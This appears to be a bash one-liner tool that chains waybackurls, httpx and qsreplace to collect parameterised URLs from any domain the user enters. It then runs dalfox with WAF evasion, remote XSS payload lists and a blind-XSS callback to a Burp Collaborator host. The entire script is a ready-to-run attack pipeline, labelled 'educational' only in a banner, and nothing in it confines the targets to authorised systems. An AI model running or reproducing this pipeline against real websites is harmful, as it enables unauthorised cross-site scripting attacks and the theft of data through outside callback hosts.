#!/bin/bash
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security
# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
# Print the quote
echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
figlet -w 80 -f small Dalfox-Burp-OneLiner | lolcat
echo ""
echo "[YOUR ARE USING dalfox-burp-oneliner.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING dalfox-burp-oneliner.sh!" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
#!/bin/bash

# Ask user to enter domain and collaborator ID
echo -e "\e[31mEnter domain (e.g. example.com):\e[0m"
read domain

echo -e "\e[31mEnter collaborator ID:\e[0m"
read collaborator_id

# Create a directory with the same name as the domain
mkdir -p $domain
cd $domain

# Find subdomains using Wayback Machine
echo -e "\e[31mFinding subdomains using Wayback Machine...\e[0m"
waybackurls $domain --silent | sort -u > urls.txt
sleep 1
# Find live subdomains
echo -e "\e[31mFinding live subdomains...\e[0m"
cat urls.txt | httpx -verbose --follow-redirects -threads 20 -o live.txt | lolcat


# Find URLs with parameters
echo -e "\e[31mFinding URLs with parameters...\e[0m"
cat live.txt | qsreplace -a | grep -vE "(.gif|.jpeg|.jpg|.js|.png|.css)" | sort -u > urls_params.txt


# Count the number of URLs
url_count=$(wc -l < urls_params.txt)
echo "Number of URLs found: $url_count" | lolcat
sleep 1

# Scan for XSS vulnerabilities using dalfox
echo -e "\e[31mScanning for XSS vulnerabilities...\e[0m"
dalfox file urls_params.txt --waf-evasion -S -b "https://$collaborator_id" --only-poc v --remote-payloads portswigger,payloadbox -o xss_results.txt

# Display results
if [[ -s "xss_results.txt" ]]
then
    echo -e "\e[31mXSS vulnerabilities found:\e[0m"
    cat xss_results.txt
else
    echo -e "\e[31mNo XSS vulnerabilities found.\e[0m"
fi
